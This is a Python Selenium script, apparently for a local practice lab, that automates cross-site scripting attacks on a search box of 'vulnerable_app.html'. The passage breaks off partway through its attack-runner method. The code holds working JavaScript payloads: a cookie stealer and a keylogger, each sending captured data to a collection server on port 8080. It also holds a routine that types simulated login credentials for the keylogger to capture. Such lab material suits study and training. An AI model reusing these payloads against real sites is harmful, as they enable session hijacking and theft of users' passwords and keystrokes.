#!/usr/bin/env python3
import requests
import time
import json
import urllib.parse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class XSSAutomation:
    def __init__(self):
        self.target_url = "http://localhost/vulnerable_app.html"
        self.collection_server = "http://localhost:8080"
        self.driver = None
        
    def setup_browser(self):
        """Setup Firefox browser with appropriate options"""
        options = Options()
        options.add_argument('--disable-web-security')
        options.add_argument('--allow-running-insecure-content')
        
        self.driver = webdriver.Firefox(options=options)
        print("[+] Browser setup complete")
        
    def inject_cookie_stealer(self):
        """Inject cookie stealing payload"""
        payload = """<script>
        var cookies = document.cookie;
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://localhost:8080/steal?cookies=' + encodeURIComponent(cookies), true);
        xhr.send();
        console.log('Cookie stealer injected');
        </script>"""
        
        try:
            self.driver.get(self.target_url)
            search_box = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.ID, "searchBox"))
            )
            
            search_box.send_keys(payload)
            search_button = self.driver.find_element(By.XPATH, "//button[text()='Search']")
            search_button.click()
            
            print("[+] Cookie stealer payload injected")
            time.sleep(2)
            
        except Exception as e:
            print(f"[-] Error injecting cookie stealer: {e}")
    
    def inject_keylogger(self):
        """Inject keylogger payload"""
        payload = """<script>
        (function() {
            var keystrokes = [];
            document.addEventListener('keypress', function(e) {
                var keystroke = {
                    key: e.key,
                    timestamp: new Date().toISOString(),
                    target: e.target.tagName + (e.target.id ? '#' + e.target.id : '')
                };
                keystrokes.push(keystroke);
                
                if (keystrokes.length >= 5) {
                    var xhr = new XMLHttpRequest();
                    xhr.open('GET', 'http://localhost:8080/keylog?type=keys&data=' + encodeURIComponent(JSON.stringify(keystrokes)), true);
                    xhr.send();
                    keystrokes = [];
                }
            });
            console.log('Keylogger injected');
        })();
        </script>"""
        
        try:
            # Clear previous search and inject keylogger
            search_box = self.driver.find_element(By.ID, "searchBox")
            search_box.clear()
            search_box.send_keys(payload)
            
            search_button = self.driver.find_element(By.XPATH, "//button[text()='Search']")
            search_button.click()
            
            print("[+] Keylogger payload injected")
            time.sleep(2)
            
        except Exception as e:
            print(f"[-] Error injecting keylogger: {e}")
    
    def simulate_user_activity(self):
        """Simulate user typing to trigger keylogger"""
        try:
            username_field = self.driver.find_element(By.ID, "username")
            password_field = self.driver.find_element(By.ID, "password")
            
            print("[+] Simulating user activity...")
            
            username_field.send_keys("admin")
            time.sleep(1)
            password_field.send_keys("password123")
            time.sleep(1)
            
            # Submit form
            login_button = self.driver.find_element(By.XPATH, "//button[text()='Login']")
            login_button.click()
            
            print("[+] User activity simulation complete")
            time.sleep(3)
            
        except Exception as e:
            print(f"[-] Error simulating user activity: {e}")
    
    def run_automated_attack(self):
        """Run the complete automated attack"""
        print("[*] Starting automated XSS attack...")
        
        try:
            self.setup_browser()
            
            print("[*] Phase 1: Cookie theft")
